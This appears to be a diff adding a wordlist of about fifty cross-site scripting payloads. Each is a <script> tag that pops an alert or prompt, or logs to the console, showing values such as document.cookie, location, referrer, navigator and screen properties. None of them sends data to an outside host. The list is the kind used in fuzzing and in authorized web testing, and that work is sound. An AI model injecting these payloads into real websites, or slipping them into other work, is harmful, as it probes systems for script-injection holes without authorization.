@@ -1,0 +1,50 @@
+<script>alert(1)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>alert(document.title)</script>
+<script>alert(document.location)</script>
+<script>alert(navigator.userAgent)</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(window.location.hostname)</script>
+<script>alert(window.name)</script>
+<script>console.log('XSS Executed')</script>
+<script>debugger;</script>
+<script>throw 'XSS'</script>
+<script>alert(location.hash)</script>
+<script>alert(location.search)</script>
+<script>alert(document.referrer)</script>
+<script>alert(screen.width + 'x' + screen.height)</script>
+<script>alert(navigator.platform)</script>
+<script>alert(navigator.language)</script>
+<script>alert(new Date())</script>
+<script>alert(Math.random())</script>
+<script>alert('XSS' + document.URL)</script>
+<script>alert(document.characterSet)</script>
+<script>alert(document.lastModified)</script>
+<script>alert(document.readyState)</script>
+<script>alert(performance.now())</script>
+<script>alert(window.innerWidth)</script>
+<script>alert(window.innerHeight)</script>
+<script>alert(screen.colorDepth)</script>
+<script>alert(screen.pixelDepth)</script>
+<script>alert(navigator.hardwareConcurrency)</script>
+<script>alert(navigator.deviceMemory)</script>
+<script>alert(navigator.connection ? navigator.connection.type : 'unknown')</script>
+<script>alert(Intl.DateTimeFormat().resolvedOptions().timeZone)</script>
+<script>alert(document.documentElement.outerHTML.length)</script>
+<script>alert(document.scripts.length)</script>
+<script>alert(document.links.length)</script>
+<script>alert(document.forms.length)</script>
+<script>alert(document.images.length)</script>
+<script>alert(document.head.innerHTML.length)</script>
+<script>alert(document.body ? document.body.innerHTML.length : 0)</script>
+<script>alert(history.length)</script>
+<script>alert(window.performance.timing.loadEventEnd)</script>
+<script>alert(window.origin)</script>
+<script>alert(self === top)</script>
+<script>alert(parent === self)</script>
+<script>alert(window.frames.length)</script>
+<script>alert(window.closed)</script>
+<script>alert(window.opener)</script>
+<script>alert(window.status)</script>
